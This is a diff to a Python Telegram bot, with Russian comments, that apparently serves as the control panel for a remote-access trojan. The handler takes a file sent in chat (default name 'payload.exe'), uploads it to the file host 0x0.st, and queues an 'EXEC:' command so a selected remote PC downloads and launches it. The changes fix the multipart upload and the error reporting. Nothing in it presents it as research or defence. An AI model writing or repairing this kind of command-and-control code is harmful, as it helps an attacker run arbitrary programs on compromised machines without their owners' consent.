@@ -1,5 +1,6 @@
 import os
 import time
+import io
 import requests
 import telebot
 from flask import Flask, request, jsonify
@@ -91,25 +92,35 @@ def handle_uploaded_file(message):
         return
 
     try:
-        bot.send_message(message.chat.id, "Получил файл, загружаю на хостинг...")
+        bot.send_message(message.chat.id, "Получил файл, обрабатываю и загружаю...")
         
         file_info = None
+        file_name = "payload.exe"
+        
         if message.document:
             file_info = bot.get_file(message.document.file_id)
+            file_name = message.document.file_name or "payload.exe"
         elif message.photo:
             file_info = bot.get_file(message.photo[-1].file_id)
+            file_name = "image.jpg"
         elif message.video:
             file_info = bot.get_file(message.video.file_id)
+            file_name = message.video.file_name or "video.mp4"
         elif message.audio:
             file_info = bot.get_file(message.audio.file_id)
+            file_name = message.audio.file_name or "audio.mp3"
 
         if not file_info:
             bot.send_message(message.chat.id, "Не удалось обработать файл.")
             return
 
-        downloaded_file = bot.download_file(file_info.file_path)
+        # Скачиваем байты из Telegram
+        downloaded_bytes = bot.download_file(file_info.file_path)
+        
+        # Оборачиваем байты в io.BytesIO, чтобы requests передал их как полноценный файл с правильным multipart-форматом
+        file_obj = io.BytesIO(downloaded_bytes)
 
-        files = {'file': ('payload.exe', downloaded_file)}
+        files = {'file': (file_name, file_obj, 'application/octet-stream')}
         response = requests.post('https://0x0.st', files=files)
 
         if response.status_code == 200 and response.text.startswith('http'):
@@ -117,10 +128,10 @@ def handle_uploaded_file(message):
             pending_commands[selected_computer] = f"EXEC:{direct_url}"
             bot.send_message(message.chat.id, f"Файл успешно отправлен на ПК {selected_computer} и запущен.")
         else:
-            bot.send_message(message.chat.id, f"Ошибка хостинга: статус {response.status_code}")
+            bot.send_message(message.chat.id, f"Ошибка хостинга (код {response.status_code}): {response.text}")
             
     except Exception as e:
-        bot.send_message(message.chat.id, f"Ошибка: {str(e)}")
+        bot.send_message(message.chat.id, f"Ошибка кода: {str(e)}")
 
 @bot.callback_query_handler(func=lambda call: True)
 def callbacks(call):
